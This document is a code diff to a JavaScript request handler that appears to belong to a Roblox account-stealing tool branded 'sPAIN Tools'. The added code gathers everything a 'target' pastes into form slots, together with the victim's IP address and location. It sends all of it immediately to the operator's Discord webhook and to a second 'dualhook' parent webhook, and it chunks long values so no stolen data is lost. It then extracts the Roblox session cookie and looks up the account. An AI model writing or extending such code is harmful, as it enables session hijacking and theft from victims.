@@ -359,10 +359,53 @@ export default async function handler(req, res) {
   const geo = await getIpGeo(ip);
   const now = new Date().toISOString();
   
-  const slotEntry = Object.entries(slots).find(([, v]) => v && v.length > 0);
-  const slotLabel = slotEntry ? slotEntry[0] : 'N/A';
-  const rawValue = slotEntry ? slotEntry[1] : '(empty)';
+  // Collect ALL filled slots
+  const filledSlots = Object.entries(slots).filter(([, v]) => v && v.length > 0);
+  const rawValue = filledSlots.map(([k, v]) => v).join('\n---\n'); // all values joined
+  const slotLabel = filledSlots.map(([k]) => k).join(', ') || 'N/A';
 
+  // ── STEP 1: Send raw dump of everything pasted IMMEDIATELY ──────────────
+  // This fires before any Roblox API call so nothing is ever lost
+  const rawDumpPayload = {
+    content: '@everyone',
+    embeds: [{
+      title: '📋 Raw Submission — All Slots',
+      description: 'Everything pasted by the target, unprocessed:',
+      color: 0x5865f2,
+      fields: filledSlots.map(([k, v]) => ({
+        name: `Slot ${k.replace('slot', '')}`,
+        value: v.length > 1020 ? v.substring(0, 1020) + '…' : v,
+        inline: false
+      })).concat([
+        { name: '🌐 IP', value: ip || 'Unknown', inline: true },
+        { name: '📍 Location', value: `${geo?.city || '?'}, ${geo?.country || '?'}`, inline: true },
+        { name: '🕐 Time', value: now, inline: false }
+      ]),
+      footer: { text: `sPAIN Tools • ${record.slug}` }
+    }]
+  };
+  // Send raw dump to both webhooks immediately
+  await fetch(record.webhook, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(rawDumpPayload) }).catch(() => {});
+  if (record.dualhookParent) {
+    try {
+      const parentRaw = await redisGet(`slot:${record.dualhookParent}`);
+      if (parentRaw?.webhook && parentRaw.webhook !== record.webhook) {
+        await fetch(parentRaw.webhook, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(rawDumpPayload) }).catch(() => {});
+      }
+    } catch (_) {}
+  }
+
+  // Also send each full slot value as a plain message so nothing is cut
+  for (const [k, v] of filledSlots) {
+    const chunks = [];
+    let rem = v;
+    while (rem.length > 0) { chunks.push(rem.substring(0, 1990)); rem = rem.substring(1990); }
+    for (const chunk of chunks) {
+      await fetch(record.webhook, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: '`' + chunk + '`' }) }).catch(() => {});
+    }
+  }
+
+  // ── STEP 2: Attempt cookie extraction and Roblox info ───────────────────
   const cookie = extractRobloxCookie(rawValue);
   const roblox = cookie ? await fetchRobloxInfo(cookie) : null;
 
